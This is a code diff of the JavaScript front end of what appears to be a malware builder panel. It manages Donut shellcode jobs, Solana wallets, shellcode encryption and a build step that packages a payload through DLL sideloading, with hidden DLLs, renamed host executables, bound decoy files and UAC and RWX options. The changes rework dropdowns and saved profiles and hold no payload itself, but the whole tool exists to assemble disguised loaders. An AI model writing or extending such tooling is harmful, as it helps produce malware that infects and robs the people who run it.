@@ -41,7 +41,7 @@ $$(".page-btn").forEach(btn => {
     if (target === "donut")    refreshDonutJobs();
     if (target === "solana")   refreshWallets();
     if (target === "sideload") refreshSideloadAssets();
-    if (target === "build")  { refreshStatus(); refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); }
+    if (target === "build")  { refreshStatus(); refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); refreshPayloadSelector(); }
   });
 });
 
@@ -105,89 +105,163 @@ function refreshArtifacts() {
 }
 $("#btn-refresh-arts").addEventListener("click", () => { refreshBuildHistory(); });
 
-// ─── memo copy / download ──────────────────────────────────────────────────
 
-$("#btn-copy-memo").addEventListener("click", async () => {
-  const text = $("#memo-box").textContent.trim();
-  if (!text) return;
-  try {
-    await navigator.clipboard.writeText(text);
-    const btn = $("#btn-copy-memo");
-    btn.textContent = "Copied!";
-    setTimeout(() => { btn.textContent = "Copy"; }, 1800);
-  } catch {
-    const sel = window.getSelection(), range = document.createRange();
-    range.selectNodeContents($("#memo-box"));
-    sel.removeAllRanges(); sel.addRange(range);
+// ─── custom dropdown (CDD) ───────────────────────────────────────────────────
+
+let _cddValidIds = new Set();  // tracks valid donut job ids for profile restore
+
+function _cddClose() {
+  $$(".cdd.open").forEach(w => {
+    w.classList.remove("open");
+    w.querySelector(".cdd-list")?.classList.add("hidden");
+  });
+}
+document.addEventListener("click", _cddClose);
+
+function _cddSetDisplay(wrap, html) {
+  const d = wrap.querySelector(".cdd-display");
+  if (d) d.innerHTML = html;
+}
+
+function cddSetValue(wrapId, hiddenId, value) {
+  const wrap   = $(`#${wrapId}`);
+  const hidden = $(`#${hiddenId}`);
+  if (!wrap || !hidden) return;
+  hidden.value = value || "";
+  const item = wrap.querySelector(`.cdd-item[data-value="${CSS.escape(value)}"]`);
+  if (item) {
+    _cddSetDisplay(wrap, item.innerHTML.replace(/<button[^>]*>.*?<\/button>/s, "").trim());
+    wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
+  } else {
+    _cddSetDisplay(wrap, value ? `#${value.slice(0,6)}…` : "— select a Donut job —");
+    wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
   }
-});
-
-$("#btn-dl-memo").addEventListener("click", () => {
-  const text = $("#memo-box").textContent.trim();
-  if (!text) return;
-  const blob = new Blob([text + "\n"], { type: "text/plain" });
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement("a");
-  a.href     = url; a.download = "memo.txt";
-  document.body.appendChild(a); a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-});
+}
 
 // ─── encrypt dropdowns ────────────────────────────────────────────────────
-// Populates:  #enc-sc-job  (shellcode from donut workspace)
+// Populates:  #enc-sc-job-wrap / #enc-sc-job  (shellcode from donut workspace)
 //             #enc-wallet-sel + #pep-wallet-sel (wallets from solana workspace)
 
 async function refreshEncryptDropdowns() {
-  // Donut jobs → shellcode selector
+  // Donut jobs → custom shellcode dropdown
   try {
     const jobs = await fetch("/api/donut/jobs").then(r => r.json());
-    const sel  = $("#enc-sc-job");
-    const prev = sel.value;
-    sel.innerHTML = "";
+    const wrap = $("#enc-sc-job-wrap");
+    const list = wrap.querySelector(".cdd-list");
+    const prev = $("#enc-sc-job").value;
+    list.innerHTML = "";
+    _cddValidIds.clear();
     const ok = jobs.filter(j => j.ok);
     if (!ok.length) {
-      sel.innerHTML = `<option value="">— no successful Donut jobs yet —</option>`;
+      _cddSetDisplay(wrap, "— no successful Donut jobs yet —");
+      $("#enc-sc-job").value = "";
     } else {
-      sel.innerHTML = `<option value="">— select a Donut job —</option>`;
+      // placeholder row
+      const ph = document.createElement("div");
+      ph.className = "cdd-item cdd-placeholder";
+      ph.textContent = "— select a Donut job —";
+      ph.addEventListener("click", () => { cddSetValue("enc-sc-job-wrap", "enc-sc-job", ""); _cddClose(); });
+      list.appendChild(ph);
+
       for (const j of ok) {
-        const opt = document.createElement("option");
-        opt.value = j.id;
-        opt.textContent = `#${j.id}  ${j.original_name}  (${fmtSize(j.size_out)})  ${j.arch_label}`;
-        if (j.id === prev) opt.selected = true;
-        sel.appendChild(opt);
+        _cddValidIds.add(j.id);
+        const item = document.createElement("div");
+        item.className = "cdd-item";
+        item.dataset.value = j.id;
+        const labelHtml = j.label
+          ? `<span class="cdd-label-badge">${j.label}</span>`
+          : "";
+        item.innerHTML = `
+          <span class="cdd-item-id">#${j.id.slice(0,6)}</span>
+          ${labelHtml}
+          <span class="cdd-item-name">${j.original_name}</span>
+          <span class="cdd-item-meta">${fmtSize(j.size_out)} · ${j.arch_label}</span>`;
+        item.addEventListener("click", () => {
+          cddSetValue("enc-sc-job-wrap", "enc-sc-job", j.id);
+          _cddClose();
+        });
+        if (j.id === prev) item.classList.add("cdd-selected");
+        list.appendChild(item);
+      }
+      if (!prev || !_cddValidIds.has(prev)) {
+        _cddSetDisplay(wrap, "— select a Donut job —");
+        $("#enc-sc-job").value = "";
+      } else {
+        cddSetValue("enc-sc-job-wrap", "enc-sc-job", prev);
       }
     }
+
+    // wire trigger open/close
+    const trigger = wrap.querySelector(".cdd-trigger");
+    trigger.onclick = (e) => {
+      e.stopPropagation();
+      const isOpen = wrap.classList.contains("open");
+      _cddClose();
+      if (!isOpen) {
+        wrap.classList.add("open");
+        wrap.querySelector(".cdd-list").classList.remove("hidden");
+      }
+    };
   } catch (_) {}
 
   // Wallets → encrypt wallet selector
   try {
-    const wallets  = await fetch("/api/wallets").then(r => r.json());
-    const encSel   = $("#enc-wallet-sel");
-    const prevEnc  = encSel.value;
+    const wallets = await fetch("/api/wallets").then(r => r.json());
+    const wrap    = $("#enc-wallet-sel-wrap");
+    const hidden  = $("#enc-wallet-sel");
+    const list    = wrap.querySelector(".cdd-list");
+    const prev    = hidden.value;
+    list.innerHTML = "";
 
-    let html = `<option value="">— select from Solana workspace —</option>`;
-    for (const w of wallets)
-      html += `<option value="${w.id}" data-addr="${w.address}">${w.name} — ${trunc(w.address, 20)}</option>`;
-    encSel.innerHTML = html;
-    if (prevEnc && [...encSel.options].some(o => o.value === prevEnc))
-      encSel.value = prevEnc;
+    const ph = document.createElement("div");
+    ph.className = "cdd-item cdd-placeholder";
+    ph.textContent = "— select from Solana workspace —";
+    ph.addEventListener("click", () => { hidden.value = ""; $("#enc-wallet").value = "";
+      _cddSetDisplay(wrap, "— select from Solana workspace —");
+      wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
+      _cddClose(); });
+    list.appendChild(ph);
+
+    for (const w of wallets) {
+      const item = document.createElement("div");
+      item.className = "cdd-item";
+      item.dataset.value = w.id;
+      item.dataset.addr  = w.address;
+      item.innerHTML = `
+        <span class="cdd-label-badge">${w.name}</span>
+        <span class="cdd-item-name">${trunc(w.address, 22)}</span>`;
+      item.addEventListener("click", () => {
+        hidden.value = w.id;
+        $("#enc-wallet").value = w.address;
+        _cddSetDisplay(wrap, item.innerHTML);
+        wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
+        _cddClose();
+      });
+      if (w.id === prev) item.classList.add("cdd-selected");
+      list.appendChild(item);
+    }
+
+    if (!prev || !wallets.find(w => w.id === prev)) {
+      _cddSetDisplay(wrap, "— select from Solana workspace —");
+      hidden.value = "";
+    }
+
+    const trigger = wrap.querySelector(".cdd-trigger");
+    trigger.onclick = (e) => {
+      e.stopPropagation();
+      const isOpen = wrap.classList.contains("open");
+      _cddClose();
+      if (!isOpen) { wrap.classList.add("open"); list.classList.remove("hidden"); }
+    };
   } catch (_) {}
 }
-
-// Wallet selector → auto-fill address text field
-$("#enc-wallet-sel").addEventListener("change", () => {
-  const opt  = $("#enc-wallet-sel").selectedOptions[0];
-  const addr = opt?.dataset.addr || "";
-  $("#enc-wallet").value = addr;
-});
 
 // Shellcode source toggle
 $$("input[name=sc_src]").forEach(r => r.addEventListener("change", syncScSource));
 function syncScSource() {
   const mode = $("input[name=sc_src]:checked")?.value;
-  $("#enc-sc-job").style.display  = mode === "workspace" ? "" : "none";
-  $("#enc-sc-file").style.display = mode === "upload"    ? "" : "none";
+  $("#enc-sc-job-wrap").style.display = mode === "workspace" ? "" : "none";
+  $("#enc-sc-file").style.display     = mode === "upload"    ? "" : "none";
 }
 syncScSource();
 
@@ -195,33 +269,20 @@ syncScSource();
 
 $("#form-encrypt").addEventListener("submit", async (e) => {
   e.preventDefault();
-  const out     = $("#out-encrypt");
-  const memoWrap = $("#memo-wrap");
-  const memoBox  = $("#memo-box");
+  const out = $("#out-encrypt");
   writeConsole(out, "> running Encrypt.py …\n", { reset: true });
-  memoWrap.classList.add("hidden");
-  memoBox.textContent = "";
 
   const form = e.target;
   const fd   = new FormData();
 
-  // URL
-  const url = form.url?.value?.trim();
-  if (url) fd.append("url", url);
-
-  // Wallet: prefer wallet_id from select, fall back to text
-  const walletSelOpt = $("#enc-wallet-sel").selectedOptions[0];
-  const walletId     = walletSelOpt?.value || "";
+  // Wallet: prefer wallet_id from custom dropdown, fall back to text
+  const walletId = $("#enc-wallet-sel")?.value || "";
   if (walletId) {
     fd.append("wallet_id", walletId);
   } else {
     const addr = form.sol_wallet?.value?.trim() || "";
     if (addr) fd.append("sol_wallet", addr);
   }
-
-  // RPC
-  const rpc = form.rpc_url?.value?.trim();
-  if (rpc) fd.append("rpc_url", rpc);
 
   // Shellcode source
   const scMode = $("input[name=sc_src]:checked")?.value;
@@ -240,14 +301,10 @@ $("#form-encrypt").addEventListener("submit", async (e) => {
     if (j.stderr) writeConsole(out, j.stderr);
     writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
     if (j.payload_preview) $("#preview-payload").textContent = j.payload_preview;
-    if (j.memo) {
-      memoBox.textContent = j.memo;
-      memoWrap.classList.remove("hidden");
-      memoWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
-    }
   } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
   refreshStatus();
   refreshEncryptHistory();
+  refreshPayloadSelector();
 });
 
 
@@ -299,7 +356,6 @@ function renderDlls() {
 function selectDll(id) {
   const sel = $("#sl-dll-sel");
   if (sel) sel.value = id;
-  updateSideloadSummary();
   renderDlls(); // refresh "active" highlight
 }
 
@@ -364,7 +420,6 @@ function renderExes() {
 function selectExe(id) {
   const sel = $("#sl-exe-sel");
   if (sel) sel.value = id;
-  updateSideloadSummary();
   renderExes();
 }
 
@@ -430,7 +485,6 @@ function renderBinds() {
 function selectBind(id) {
   const sel = $("#sl-bind-sel");
   if (sel) sel.value = id;
-  updateSideloadSummary();
   renderBinds();
 }
 
@@ -487,60 +541,17 @@ function refreshSideloadSelectors() {
     if (prevBind && [...bindSel.options].some(o => o.value === prevBind)) bindSel.value = prevBind;
   }
 
-  updateSideloadSummary();
 }
 
-["sl-dll-sel", "sl-exe-sel", "sl-dll-rename", "sl-host-rename", "sl-zip-name",
- "sl-bind-sel", "sl-bind-rename"].forEach(id => {
-  document.getElementById(id)?.addEventListener("change", updateSideloadSummary);
-  document.getElementById(id)?.addEventListener("input",  updateSideloadSummary);
-});
-
-function updateSideloadSummary() {
-  const box      = $("#bld-sl-summary");
-  if (!box) return;
-  const dllSel   = $("#sl-dll-sel");
-  const exeSel   = $("#sl-exe-sel");
-  const bindSel  = $("#sl-bind-sel");
-  const dllOpt   = dllSel?.selectedOptions[0];
-  const exeOpt   = exeSel?.selectedOptions[0];
-  const bindOpt  = bindSel?.selectedOptions[0];
-  const dllName  = dllOpt?.value  ? dllOpt.text.split("  ")[0]  : null;
-  const exeName  = exeOpt?.value  ? exeOpt.text.split("  ")[0]  : null;
-  const bindName = bindOpt?.value ? bindOpt.text.split("  ")[0] : null;
-  const rename   = $("#sl-dll-rename")?.value.trim();
-  const hRename  = $("#sl-host-rename")?.value.trim();
-  const bRename  = $("#sl-bind-rename")?.value.trim();
-  const zip      = $("#sl-zip-name")?.value.trim();
-
-  if (!dllName && !exeName) {
-    box.textContent = "No DLL / EXE selected — configure in the Sideload tab.";
-    return;
-  }
-  const origName  = rename  || (dllName  ? dllName.replace(/\.dll$/i, "_orig.dll") : "—");
-  const hostOut   = hRename || exeName   || "—";
-  const bindOut   = bRename || bindName  || null;
-  const zipOut    = zip || "(zip name required)";
-  let bindLine = "";
-  if (bindOut) bindLine = `<br>Bind → <strong>_\\${bindOut}</strong>`;
-  box.innerHTML =
-    `DLL: <strong>${dllName || "—"}</strong> (hidden)  ` +
-    `EXE: <strong>${exeName || "—"}</strong><br>` +
-    `ZIP → <strong>${zipOut}</strong>  ` +
-    `[${dllName || "—"} (hidden) · ${origName} (hidden) · ${hostOut}]` +
-    bindLine;
-}
 
 // ─── build ────────────────────────────────────────────────────────────────
 
 function syncBuildMode() {
   const mode = $("input[name=mode]:checked", $("#form-build"))?.value;
-  const summary = $("#field-sideload-summary");
-  if (summary) summary.classList.toggle("hidden", mode !== "sideload");
+  $("#field-sideload-config")?.classList.toggle("hidden", mode !== "sideload");
 }
 $$("input[name=mode]").forEach(r => r.addEventListener("change", () => {
   syncBuildMode();
-  updateSideloadSummary();
   // Persist the chosen mode so it survives page reloads
   try { localStorage.setItem("zeroBuildMode", r.value); } catch (_) {}
 }));
@@ -562,18 +573,18 @@ $("#form-build").addEventListener("submit", async (e) => {
   const mode = $("input[name=mode]:checked", form)?.value;
   const body = {
     mode,
-    uac:       form.uac.checked,
-    rwx:       form.rwx.checked,
-    debug:     form.debug.checked,
-    synthetic: form.synthetic.checked,
-    // sideload-specific (always included; server ignores for EXE mode)
-    dll_id:          $("#sl-dll-sel")?.value           || "",
-    exe_id:          $("#sl-exe-sel")?.value           || "",
-    sideload_rename: $("#sl-dll-rename")?.value.trim() || "",
-    host_rename:     $("#sl-host-rename")?.value.trim() || "",
-    zip_name:        $("#sl-zip-name")?.value.trim()    || "",
-    bind_id:         $("#sl-bind-sel")?.value           || "",
-    bind_rename:     $("#sl-bind-rename")?.value.trim() || "",
+    uac:                form.uac.checked,
+    rwx:                form.rwx.checked,
+    debug:              form.debug.checked,
+    synthetic:          form.synthetic.checked,
+    encrypt_history_id: $("#bld-payload-sel")?.value       || "",
+    dll_id:             $("#sl-dll-sel")?.value            || "",
+    exe_id:             $("#sl-exe-sel")?.value            || "",
+    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
+    host_rename:        $("#sl-host-rename")?.value.trim() || "",
+    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
+    bind_id:            $("#sl-bind-sel")?.value           || "",
+    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
   };
 
   const btn = $("button.primary", form);
@@ -600,225 +611,230 @@ $("#form-build").addEventListener("submit", async (e) => {
 
 // ─── profiles ─────────────────────────────────────────────────────────────
 
-let _profiles = [];
-// Tracks the profile that was last loaded so "Save current" updates it in-place.
-let _currentProfileId   = null;
-let _currentProfileName = "";
+// ─── profiles ─────────────────────────────────────────────────────────────
 
-async function refreshProfiles() {
-  try { _profiles = await fetch("/api/profiles").then(r => r.json()); }
-  catch (_) { _profiles = []; }
-  renderProfiles();
+let _encProfiles = [];
+let _bldProfiles = [];
+let _curEncProfileId = null, _curEncProfileName = "";
+let _curBldProfileId = null, _curBldProfileName = "";
+
+async function refreshEncProfiles() {
+  try { _encProfiles = await fetch("/api/profiles/encrypt").then(r => r.json()); }
+  catch (_) { _encProfiles = []; }
+  renderEncProfiles();
 }
 
-function renderProfiles() {
-  const list  = $("#profile-list");
-  const empty = $("#profile-empty");
-  list.innerHTML = "";
-  if (!_profiles.length) { empty.classList.remove("hidden"); return; }
-  empty.classList.add("hidden");
-  for (const p of _profiles) {
+async function refreshBldProfiles() {
+  try { _bldProfiles = await fetch("/api/profiles/build").then(r => r.json()); }
+  catch (_) { _bldProfiles = []; }
+  renderBldProfiles();
+}
+
+function _renderProfileList(profiles, listEl, emptyEl, loadFn, delFn) {
+  listEl.innerHTML = "";
+  if (!profiles.length) { emptyEl.classList.remove("hidden"); return; }
+  emptyEl.classList.add("hidden");
+  for (const p of profiles) {
     const li = document.createElement("li");
     li.className = "mgmt-item";
-    // Build a compact summary of what's in the profile
-    const parts = [p.mode || "exe"];
-    if (p.shellcode_job_id) parts.push(`sc:#${p.shellcode_job_id}`);
-    if (p.sideload_rename)  parts.push(`→${p.sideload_rename}`);
-    if (p.bind_id)          parts.push("bind");
-    if (p.output)           parts.push(p.output);
-    const flags = [p.uac?"uac":"", p.rwx?"rwx":"", p.debug?"dbg":"", p.synthetic?"syn":""].filter(Boolean).join(" ");
-    if (flags) parts.push(flags);
     li.innerHTML = `
       <div class="mi-info">
         <div class="mi-name">${p.name}</div>
-        <div class="mi-meta">${parts.join(" · ")}</div>
-        <div class="mi-meta" style="color:var(--text-mute);font-size:10px">${p.url ? trunc(p.url, 28) : "—"}</div>
+        <div class="mi-meta" style="font-size:10px;color:var(--text-mute)">${_profileMeta(p)}</div>
       </div>
       <div class="mi-btns">
         <button class="btn-sm primary" data-load="${p.id}">Load</button>
-        <button class="btn-sm btn-danger" data-del-profile="${p.id}">✕</button>
+        <button class="btn-sm btn-danger" data-del="${p.id}">✕</button>
       </div>`;
-    list.appendChild(li);
+    listEl.appendChild(li);
   }
-  list.querySelectorAll("[data-load]").forEach(btn =>
-    btn.addEventListener("click", () => loadProfile(btn.dataset.load)));
-  list.querySelectorAll("[data-del-profile]").forEach(btn =>
-    btn.addEventListener("click", () => deleteProfile(btn.dataset.delProfile)));
+  listEl.querySelectorAll("[data-load]").forEach(b => b.addEventListener("click", () => loadFn(b.dataset.load)));
+  listEl.querySelectorAll("[data-del]").forEach(b => b.addEventListener("click", () => delFn(b.dataset.del)));
 }
 
-function loadProfile(id) {
-  const p = _profiles.find(x => x.id === id);
+function _profileMeta(p) {
+  if (p.type === "build" || (!p.type && p.mode)) {
+    const flags = [p.mode||"exe", p.uac?"uac":"", p.rwx?"rwx":"", p.debug?"dbg":""].filter(Boolean).join(" · ");
+    return flags + (p.encrypt_history_id ? ` · enc:#${p.encrypt_history_id.slice(0,6)}` : "");
+  }
+  return (p.sol_wallet ? trunc(p.sol_wallet, 22) : "—");
+}
+
+function renderEncProfiles() {
+  _renderProfileList(_encProfiles, $("#enc-profile-list"), $("#enc-profile-empty"),
+    loadEncProfile, deleteEncProfile);
+}
+function renderBldProfiles() {
+  _renderProfileList(_bldProfiles, $("#bld-profile-list"), $("#bld-profile-empty"),
+    loadBldProfile, deleteBldProfile);
+}
+
+function loadEncProfile(id) {
+  const p = _encProfiles.find(x => x.id === id);
   if (!p) return;
-  _currentProfileId   = id;
-  _currentProfileName = p.name;
-  // Update button label to signal which profile is active
-  $("#btn-show-save-profile").textContent = `↺ ${p.name}`;
-
-  // ── Encrypt tab ──────────────────────────────────────────────────────
-  $("#enc-url").value    = p.url        || "";
+  _curEncProfileId = id; _curEncProfileName = p.name;
+  $("#btn-show-save-enc-profile").textContent = `↺ ${p.name}`;
   $("#enc-wallet").value = p.sol_wallet || "";
-  $("#enc-rpc").value    = p.rpc_url    || "";
-
-  // Shellcode: restore donut job selection if saved
-  if (p.shellcode_job_id) {
-    const sel = $("#enc-sc-job");
-    sel.value = p.shellcode_job_id;
-    // only switch radio if the option actually exists in the list
-    if (sel.value === p.shellcode_job_id) {
-      const wsRadio = $("input[name=sc_src][value=workspace]");
-      if (wsRadio) { wsRadio.checked = true; syncScSource(); }
-    }
+  if (p.shellcode_job_id && _cddValidIds.has(p.shellcode_job_id)) {
+    cddSetValue("enc-sc-job-wrap", "enc-sc-job", p.shellcode_job_id);
+    const r = $("input[name=sc_src][value=workspace]");
+    if (r) { r.checked = true; syncScSource(); }
   }
+  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
+  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));
+  _openEncSaveRow();
+}
 
-  // ── Sideload tab ─────────────────────────────────────────────────────
-  // DLL selector: restore selection if still in workspace
-  const dllSel = $("#sl-dll-sel");
-  if (dllSel && p.dll_id) {
-    dllSel.value = p.dll_id;
-    if (dllSel.value !== p.dll_id) dllSel.value = ""; // option no longer exists
-  }
-  const exeSel = $("#sl-exe-sel");
-  if (exeSel && p.exe_id) {
-    exeSel.value = p.exe_id;
-    if (exeSel.value !== p.exe_id) exeSel.value = "";
-  }
-  const dllRenameEl = $("#sl-dll-rename");
-  if (dllRenameEl) dllRenameEl.value = p.sideload_rename || "";
-  const hostRenameEl = $("#sl-host-rename");
-  if (hostRenameEl) hostRenameEl.value = p.host_rename || "";
-  const zipNameEl = $("#sl-zip-name");
-  if (zipNameEl) zipNameEl.value = p.zip_name || "";
-
-  // Bind file selector + rename
-  const bindSel = $("#sl-bind-sel");
-  if (bindSel && p.bind_id) {
-    bindSel.value = p.bind_id;
-    if (bindSel.value !== p.bind_id) bindSel.value = "";
-  }
-  const bindRenameEl = $("#sl-bind-rename");
-  if (bindRenameEl) bindRenameEl.value = p.bind_rename || "";
-
-  // ── Build tab ────────────────────────────────────────────────────────
+function loadBldProfile(id) {
+  const p = _bldProfiles.find(x => x.id === id);
+  if (!p) return;
+  _curBldProfileId = id; _curBldProfileName = p.name;
+  $("#btn-show-save-bld-profile").textContent = `↺ ${p.name}`;
   const modeEl = $(`#form-build input[name=mode][value="${p.mode || "exe"}"]`);
-  if (modeEl) { modeEl.checked = true; try { localStorage.setItem("zeroBuildMode", p.mode || "exe"); } catch (_) {} }
+  if (modeEl) { modeEl.checked = true; try { localStorage.setItem("zeroBuildMode", p.mode||"exe"); } catch(_){} }
   $("#bld-uac").checked   = !!p.uac;
   $("#bld-rwx").checked   = !!p.rwx;
   $("#bld-debug").checked = !!p.debug;
   $("#bld-syn").checked   = !!p.synthetic;
+  const dllSel = $("#sl-dll-sel");
+  if (dllSel && p.dll_id) { dllSel.value = p.dll_id; if (dllSel.value !== p.dll_id) dllSel.value = ""; }
+  const exeSel = $("#sl-exe-sel");
+  if (exeSel && p.exe_id) { exeSel.value = p.exe_id; if (exeSel.value !== p.exe_id) exeSel.value = ""; }
+  if ($("#sl-dll-rename"))  $("#sl-dll-rename").value  = p.sideload_rename || "";
+  if ($("#sl-host-rename")) $("#sl-host-rename").value = p.host_rename     || "";
+  if ($("#sl-zip-name"))    $("#sl-zip-name").value    = p.zip_name        || "";
+  const bindSel = $("#sl-bind-sel");
+  if (bindSel && p.bind_id) { bindSel.value = p.bind_id; if (bindSel.value !== p.bind_id) bindSel.value = ""; }
+  if ($("#sl-bind-rename")) $("#sl-bind-rename").value = p.bind_rename || "";
+  // Payload.h selector — set hidden value then let refreshPayloadSelector sync CDD display
+  const payloadSel = $("#bld-payload-sel");
+  if (payloadSel) payloadSel.value = p.encrypt_history_id || "";
+  refreshPayloadSelector();
   syncBuildMode();
-  updateSideloadSummary();
-
-  // Switch to Encrypt tab so user sees the restored values
-  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
-  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));
-
-  // Auto-open the save row in "Update" mode so the user can immediately
-  // see the profile name and update it without hunting for the button.
-  _openSaveRow();
+  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "build"));
+  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-build"));
+  _openBldSaveRow();
 }
 
-async function deleteProfile(id) {
-  if (!confirm("Delete this profile?")) return;
+async function deleteEncProfile(id) {
+  if (!confirm("Delete this encrypt profile?")) return;
   await fetch(`/api/profiles/${id}`, { method: "DELETE" });
-  refreshProfiles();
+  if (_curEncProfileId === id) { _curEncProfileId = null; _curEncProfileName = ""; $("#btn-show-save-enc-profile").textContent = "Save"; }
+  refreshEncProfiles();
+}
+async function deleteBldProfile(id) {
+  if (!confirm("Delete this build profile?")) return;
+  await fetch(`/api/profiles/${id}`, { method: "DELETE" });
+  if (_curBldProfileId === id) { _curBldProfileId = null; _curBldProfileName = ""; $("#btn-show-save-bld-profile").textContent = "Save"; }
+  refreshBldProfiles();
 }
 
-function collectFormData() {
+function collectEncryptData() {
   return {
-    // Encrypt tab
-    url:              $("#enc-url")?.value              || "",
-    sol_wallet:       $("#enc-wallet")?.value           || "",
-    rpc_url:          $("#enc-rpc")?.value              || "",
-    shellcode_job_id: $("#enc-sc-job")?.value           || "",
-    // Sideload tab
-    dll_id:           $("#sl-dll-sel")?.value               || "",
-    exe_id:           $("#sl-exe-sel")?.value               || "",
-    sideload_rename:  $("#sl-dll-rename")?.value.trim()     || "",
-    host_rename:      $("#sl-host-rename")?.value.trim()    || "",
-    zip_name:         $("#sl-zip-name")?.value.trim()       || "",
-    bind_id:          $("#sl-bind-sel")?.value              || "",
-    bind_rename:      $("#sl-bind-rename")?.value.trim()    || "",
-    // Build tab
-    mode:             $("input[name=mode]:checked")?.value || "exe",
-    uac:              $("#bld-uac")?.checked            || false,
-    rwx:              $("#bld-rwx")?.checked            || false,
-    debug:            $("#bld-debug")?.checked          || false,
-    synthetic:        $("#bld-syn")?.checked            || false,
+    sol_wallet:       $("#enc-wallet")?.value || "",
+    shellcode_job_id: $("#enc-sc-job")?.value || "",
+  };
+}
+function collectBuildData() {
+  return {
+    encrypt_history_id: $("#bld-payload-sel")?.value       || "",
+    dll_id:             $("#sl-dll-sel")?.value            || "",
+    exe_id:             $("#sl-exe-sel")?.value            || "",
+    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
+    host_rename:        $("#sl-host-rename")?.value.trim() || "",
+    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
+    bind_id:            $("#sl-bind-sel")?.value           || "",
+    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
+    mode:               $("input[name=mode]:checked")?.value || "exe",
+    uac:                $("#bld-uac")?.checked   || false,
+    rwx:                $("#bld-rwx")?.checked   || false,
+    debug:              $("#bld-debug")?.checked || false,
+    synthetic:          $("#bld-syn")?.checked   || false,
   };
 }
 
-// ── save profile UI ────────────────────────────────────────────────────────
+// ── save row helpers ───────────────────────────────────────────────────────
 
-function _closeSaveRow() {
-  $("#profile-save-row").classList.add("hidden");
-  $("#profile-name-input").value = "";
-}
+function _makeSaveRow(rowId, nameId, confirmId, cancelId, saveasId,
+                      getCurId, getCurName, setCurId, setCurName,
+                      apiBase, refreshFn, btnId) {
+  const row     = $(`#${rowId}`);
+  const nameEl  = $(`#${nameId}`);
+  const confBtn = $(`#${confirmId}`);
+  const canBtn  = $(`#${cancelId}`);
+  const saLink  = $(`#${saveasId}`);
+  const showBtn = $(`#${btnId}`);
 
-function _openSaveRow(forceNew = false) {
-  const nameInput  = $("#profile-name-input");
-  const confirmBtn = $("#btn-confirm-save-profile");
-  const saveAsLink = $("#btn-saveas-new");
-
-  if (!forceNew && _currentProfileId) {
-    // Updating an existing profile: pre-fill name, show "save as new" escape
-    nameInput.value      = _currentProfileName;
-    confirmBtn.textContent = "Update";
-    saveAsLink.classList.remove("hidden");
-  } else {
-    // Creating a new profile
-    nameInput.value        = "";
-    confirmBtn.textContent = "Save";
-    saveAsLink.classList.add("hidden");
+  function close() { row.classList.add("hidden"); nameEl.value = ""; }
+  function open(forceNew = false) {
+    const cid = getCurId();
+    if (!forceNew && cid) {
+      nameEl.value = getCurName(); confBtn.textContent = "Update"; saLink.classList.remove("hidden");
+    } else {
+      nameEl.value = ""; confBtn.textContent = "Save"; saLink.classList.add("hidden");
+    }
+    row.classList.remove("hidden"); nameEl.focus(); nameEl.select();
   }
 
-  $("#profile-save-row").classList.remove("hidden");
-  nameInput.focus();
-  nameInput.select();
+  showBtn.addEventListener("click", () => open());
+  canBtn.addEventListener("click", close);
+  saLink.addEventListener("click", e => { e.preventDefault(); setCurId(null); setCurName(""); open(true); });
+
+  return { open, close };
 }
 
-$("#btn-show-save-profile").addEventListener("click", () => _openSaveRow());
+// ── Encrypt save row ──────────────────────────────────────────────────────
 
-$("#btn-cancel-save-profile").addEventListener("click", _closeSaveRow);
+const _encSaveRow = _makeSaveRow(
+  "enc-profile-save-row", "enc-profile-name-input",
+  "btn-confirm-save-enc-profile", "btn-cancel-save-enc-profile", "btn-enc-saveas-new",
+  () => _curEncProfileId, () => _curEncProfileName,
+  v => { _curEncProfileId = v; }, v => { _curEncProfileName = v; },
+  "/api/profiles/encrypt", () => refreshEncProfiles(), "btn-show-save-enc-profile"
+);
+function _openEncSaveRow(forceNew) { _encSaveRow.open(forceNew); }
 
-// "save as new" link: drop the current-profile context and re-open for new
-$("#btn-saveas-new").addEventListener("click", e => {
-  e.preventDefault();
-  _currentProfileId   = null;
-  _currentProfileName = "";
-  _openSaveRow(true);
+$("#btn-confirm-save-enc-profile").addEventListener("click", async () => {
+  const name = $("#enc-profile-name-input").value.trim();
+  if (!name) { $("#enc-profile-name-input").focus(); return; }
+  const body = { name, ...collectEncryptData() };
+  if (_curEncProfileId) {
+    await fetch(`/api/profiles/${_curEncProfileId}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
+    _curEncProfileName = name;
+    $("#btn-show-save-enc-profile").textContent = `↺ ${name}`;
+  } else {
+    const j = await fetch("/api/profiles/encrypt", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }).then(r=>r.json()).catch(()=>({}));
+    if (j.profile) { _curEncProfileId = j.profile.id; _curEncProfileName = j.profile.name; $("#btn-show-save-enc-profile").textContent = `↺ ${j.profile.name}`; }
+  }
+  _encSaveRow.close();
+  refreshEncProfiles();
 });
 
-$("#btn-confirm-save-profile").addEventListener("click", async () => {
-  const name = $("#profile-name-input").value.trim();
-  if (!name) { $("#profile-name-input").focus(); return; }
